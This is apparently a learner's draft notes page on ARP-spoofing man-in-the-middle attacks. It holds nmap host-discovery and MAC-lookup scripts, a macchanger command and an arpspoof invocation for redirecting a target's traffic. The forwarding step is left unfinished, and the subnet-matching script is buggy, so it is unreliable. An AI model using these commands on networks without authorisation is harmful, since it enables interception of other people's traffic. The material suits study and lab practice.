# TODO - Man in the Middle with ARP spoofing

Welcome again :D&#x20;

Im actually pleased of myself because Im explaining to me and Im actually understanding something LOL

## Recap

### change the MAC

```
sudo macchanger -r eth0 
```

### reverse DNS request to get all the hostname

and find the target

```bash
nmap -sL 192.168.1.0/24
# -sL     reverse DNS resolution (send no packet to the host, 
                only to the DNS server probably)
```

### scan all your LAN

```bash
#! /bin/bash

echo "change your MAC =D"

ip=$(hostname -I | awk '{print $1}')
ip="${ip##*( )}"
ip_selected=()

if [[ "$ip" == *"$192"* ]]; then
    ip_selected=192.168.0.0/16
elif [[ "$ip" == *"$172"* ]]; then
    ip_selected=172.16.0.0/12
elif [[ "$ip" == *"$10"* ]]; then
    ip_selected=10.0.0.0/8
fi

# echo "$ip_selected"
nmap -sL "$ip_selected" 2>&1 | tee | grep --line-buffered -e \( | awk -Ffor '{print $2}'
```

### check if host is alive

{% embed url="https://security.stackexchange.com/questions/36198/how-to-find-live-hosts-on-my-network" %}

```bash
nmap -sn 192.168.1.68

# -sn     disable port scan
# -sn is the same as -sP (Ping scan)
# this command is not 100% reliable, it is reliable enough though
```

{% embed url="https://unix.stackexchange.com/questions/87935/nmap-sn-scan-or-no-scan" %}

## Get MAC addrs

A script could be useful.

```
./basic_mitm 192.168.1.68 192.168.1.1
```

```
-n     no DNS resolution 
-sP    skip port scan
```

```bash
#!/bin/bash

echo "$1"
echo "$2"

mac1=$(sudo nmap -nsP "$1" | grep MAC | awk -F\  ' { print $3 } ' )
mac2=$(sudo nmap -nsP "$2" | grep MAC | awk -F\  ' { print $3 } ' )

echo "$mac1"
echo "$mac2"
```

## Packet redirect

Now a method is needed to be able to not block the connection of the target host with the router.

<details>

<summary>How can I forward using MAC addrs, or IP?</summary>

* _bridge_ command from iproute2 package
* iptables mac command
* ebtables

</details>

### Let's think

There are 3 actor:

1. `target_host : 192.168.1.65`
2. `mitm_host : 192.168.1.100`
3. `default_gateway : 192.168.1.1`

**After the ARP spoof**:

1. `target_host` send packets to `192.168.1.1` but using `mitm_mac`
2. `mitm_host` get packets from `192.168.1.65` going to `192.168.1.1`
3. so `mitm_host` forwards packets to the `default_gateway`&#x20;
4. the `default_gateway` thinks that `192.168.1.65` is the `mitm_host` because that IP is registered (in his arp table) with the `mitm_mac`
5. so `mitm_host` now receives packets from `192.168.1.1` going to `192.168.1.65`

So, this should work:

```
sysctl -w net.ipv4.ip_forward=1
```

But doesn't.

{% hint style="warning" %}
This because `mitm_host` IP is `192.168.1.100` so every packets coming from `target_host` to IP `192.168.1.65` is rejected by default.\
\
Simply `mitm_host` receives packets going to `192.168.1.65 and says "these are not my packets because I am 192.168.1.100" and then rejects theme.`
{% endhint %}

## [iptables](todo-iptables.md)

{% hint style="info" %}
iptables command has a "mac" section that could be useful
{% endhint %}

## ARP spoofing

```

sudo arpspoof -i eth0 -t 192.168.1.68 -r 192.168.1.1 
```

## Sources

{% embed url="https://www.cyberciti.biz/tips/iptables-mac-address-filtering.html" %}

{% embed url="https://explainshell.com/explain/1/nmap" %}

{% embed url="https://unix4lyfe.org/darkstat" %}
